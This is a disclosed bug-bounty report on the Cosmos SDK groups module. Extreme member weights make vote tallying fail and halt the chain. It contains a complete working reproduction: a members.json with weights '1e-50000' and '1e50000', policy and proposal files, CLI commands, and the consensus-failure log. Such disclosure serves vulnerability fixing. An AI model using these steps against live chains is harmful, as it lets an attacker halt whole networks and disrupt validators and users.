# Groups module can halt chain when handling a proposal with malicious group weights 

## Report Details
- **Report ID**: 3018307
- **URL**: https://hackerone.com/reports/3018307
- **State**: Closed
- **Severity**: high
- **Submitted**: 2025-02-28T12:59:54.445Z
- **Disclosed**: 2025-04-23T23:00:29.126Z

## Reporter
- **Username**: vakzz
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: cosmos

## Vulnerability Information
### Summary of Impact

After having a look into the patch for https://github.com/cosmos/cosmos-sdk/security/advisories/GHSA-x5vx-95h7-rv4p I discovered a very similar bug.

The original error was due to a divide by zero at https://github.com/cosmos/cosmos-sdk/blob/v0.50.12/x/group/types.go#L215 when the total power was zero.

```go
yesPercentage, err := yesCount.Quo(totalPowerDec)
```

The patch prevented groups from having zero power and also added a guard to the division:
```go
if totalPowerDec.IsZero() {
        return DecisionPolicyResult{Allow: false, Final: true}, nil
}
yesPercentage, err := yesCount.Quo(totalPowerDec)
```

The issue is that there are other ways that `Quo` can fail, such as if the exponent of the resulting value is out of range:
https://github.com/cockroachdb/apd/blob/master/decimal.go#L293-L309
```golang
// setExponent sets d's Exponent to the sum of xs. Each value and the sum
// of xs must fit within an int32. An error occurs if the sum is outside of
// the MaxExponent or MinExponent range. res is any Condition previously set
// for this operation, which can cause Underflow to be set if, for example,
// Inexact is already set.
func (d *Decimal) setExponent(c *Context, res Condition, xs ...int64) Condition {
    var sum int64
    for _, x := range xs {
        if x > MaxExponent {
            return SystemOverflow | Overflow
        }
        if x < MinExponent {
            return SystemUnderflow | Underflow
        }
        sum += x
    }
    r := int32(sum)
```

Since there are no limits on group member weight, it's possible to trigger this failure by having two members with weights of `"1e-50000"` and `"1e50000"`. If the user with the tiny weight votes yes, `yesCount.Quo(totalPowerDec)` will return an error `decimal quotient error: exponent out of range` and cause a chain halt when `doTallyAndUpdate` is called from the EndBlocker.

### Steps to Reproduce
Create a new chain with ignite:
```bash
ignite scaffold chain example
cd example
ignite chain serve

#  Cosmos SDK's version is: v0.50.12
```

Create the following two json files using the addressed created by ignite server:

members.json
```json
{
    "members": [
        {
            "address": "cosmos14xzyhnr8w098awcf8l6t57qw3qlhcwsntytvm0",
            "weight": "1e-50000"
        },
        {
            "address": "cosmos18v59wacnwz89qphdez62m6nn7qse8mgfr7m0lk",
            "weight": "1e50000"
        }
    ]
}
```

policy.json
```json
{
    "@type": "/cosmos.group.v1.PercentageDecisionPolicy",
    "percentage": "0.5",
    "windows": {
        "voting_period": "10s",
        "min_execution_period": "20s"
    }
}
```

Create the group and transfer some funds to the policy address for testing:

```bash
exampled tx group create-group-with-policy cosmos14xzyhnr8w098awcf8l6t57qw3qlhcwsntytvm0 "" "" members.json policy.json --gas auto --yes
exampled q group group-policies-by-admin cosmos14xzyhnr8w098awcf8l6t57qw3qlhcwsntytvm0
exampled tx bank send cosmos14xzyhnr8w098awcf8l6t57qw3qlhcwsntytvm0 cosmos17pmq7hp4upvmmveqexzuhzu64v36re3w3447n7dt46uwp594wtpsqv4fn5 100stake --gas auto --yes
```

Create a new proposal file:

proposal.json
```
{
    "group_policy_address": "cosmos17pmq7hp4upvmmveqexzuhzu64v36re3w3447n7dt46uwp594wtpsqv4fn5",
    "messages": [
        {
            "@type": "/cosmos.bank.v1beta1.MsgSend",
            "from_address": "cosmos17pmq7hp4upvmmveqexzuhzu64v36re3w3447n7dt46uwp594wtpsqv4fn5",
            "to_address": "cosmos14xzyhnr8w098awcf8l6t57qw3qlhcwsntytvm0",
            "amount": [
                {
                    "denom": "stake",
                    "amount": "10"
                }
            ]
        }
    ],
    "metadata": "",
    "title": "crash",
    "summary": "crash",
    "proposers": [
        "cosmos14xzyhnr8w098awcf8l6t57qw3qlhcwsntytvm0"
    ]
}
```

Submit and vote for the proposal
```
exampled tx group submit-proposal proposal.json --gas auto --yes
exampled tx group vote 1 cosmos14xzyhnr8w098awcf8l6t57qw3qlhcwsntytvm0 VOTE_OPTION_YES "" --gas auto --yes
```

Chain halts:
```
[EXAMPLED] 11:20PM ERR error in proxyAppConn.FinalizeBlock err="doTallyAndUpdate: policy allow: decimal quotient error: exponent out of range" module=state
[EXAMPLED] 11:20PM ERR CONSENSUS FAILURE!!! err="failed to apply block; error doTallyAndUpdate: policy allow: decimal quotient error: exponent out of range [cockroachdb/apd/v2@v2.0.2/condition.go:107]" module=consensus stack="goroutine 80 [running]:\nruntime/debug.Stack()\n\t/opt/homebrew/Cellar/go/1.23.2/libexec/src/runtime/debug/stack.go:26 +0x64\ngithub.com/cometbft/cometbft/consensus.(*State).receiveRoutine.func2()\n\t/Users/will/go/pkg/mod/github.com/cometbft/cometbft@v0.38.17/consensus/state.go:801 +0x4c\npanic({0x109639ae0?, 0x14001246280?})\n\t/opt/homebrew/Cellar/go/1.23.2/libexec/src/runtime/panic.go:785 +0xf0\ngithub.com/cometbft/cometbft/consensus.(*State).finalizeCommit(0x14001751c08, 0x5c6)\n\t/Users/will/go/pkg/mod/github.com/cometbft/cometbft@v0.38.17/consensus/state.go:1781 +0x1030\ngithub.com/cometbft/cometbft/consensus.(*State).tryFinalizeCommit(0x14001751c08, 0x5c6)\n\t/Users/will/go/pkg/mod/github.com/cometbft/cometbft@v0.38.17/consensus/state.go:1682 +0x2c0\ngithub.com/cometbft/cometbft/consensus.(*State).enterCommit.func1()\n\t/Users/will/go/pkg/mod/github.com/cometbft/cometbft@v0.38.17/consensus/state.go:1617 +0xb8\ngithub.com/cometbft/cometbft/consensus.(*State).enterCommit(0x14001751c08, 0x5c6, 0x0)\n\t/Users/will/go/pkg/mod/github.com/cometbft/cometbft@v0.38.17/consensus/state.go:1655 +0xd90\ngithub.com/cometbft/cometbft/consensus.(*State).addVote(0x14001751c08, 0x14002549040, {0x0, 0x0})\n\t/Users/will/go/pkg/mod/github.com/cometbft/cometbft@v0.38.17/consensus/state.go:2343 +0x2a58\ngithub.com/cometbft/cometbft/consensus.(*State).tryAddVote(0x14001751c08, 0x14002549040, {0x0, 0x0})\n\t/Users/will/go/pkg/mod/github.com/cometbft/cometbft@v0.38.17/consensus/state.go:2067 +0x50\ngithub.com/cometbft/cometbft/consensus.(*State).handleMsg(0x14001751c08, {{0x109ca2080, 0x140017185d0}, {0x0, 0x0}})\n\t/Users/will/go/pkg/mod/github.com/cometbft/cometbft@v0.38.17/consensus/state.go:929 +0x5c0\ngithub.com/cometbft/cometbft/consensus.(*State).receiveRoutine(0x14001751c08, 0x0)\n\t/Users/will/go/pkg/mod/github.com/cometbft/cometbft@v0.38.17/consensus/state.go:856 +0x5fc\ncreated by github.com/cometbft/cometbft/consensus.(*State).OnStart in goroutine 1\n\t/Users/will/go/pkg/mod/github.com/cometbft/cometbft@v0.38.17/consensus/state.go:398 +0x1e4\n"
[EXAMPLED] 11:20PM INF service stop impl=baseWAL module=consensus msg="Stopping baseWAL service" wal=/Users/will/.example/data/cs.wal/wal
[EXAMPLED] 11:20PM INF service stop impl=Group module=consensus msg="Stopping Group service" wal=/Users/will/.example/data/cs.wal/wal
[EXAMPLED] 11:20PM INF Timed out dur=1000 height=1478 module=consensus round=0 step=RoundStepPropose
```

### Workarounds
I think a patch/update will need to be applied to fix the issue.

### Supporting Material/References
Criticality: High (Considerable Impact; Likely Likelihood per [ACMv1.2](https://github.com/interchainio/security/blob/main/resources/CLASSIFICATION_MATRIX.md))
Affected users: Validators, Full nodes, Users on chains that utilize the groups module

## Impact

A malicious user that can interact with the groups module can cause the entire chain to halt. Any chain that utilizes the groups module is affected.

## Attachments
No attachments
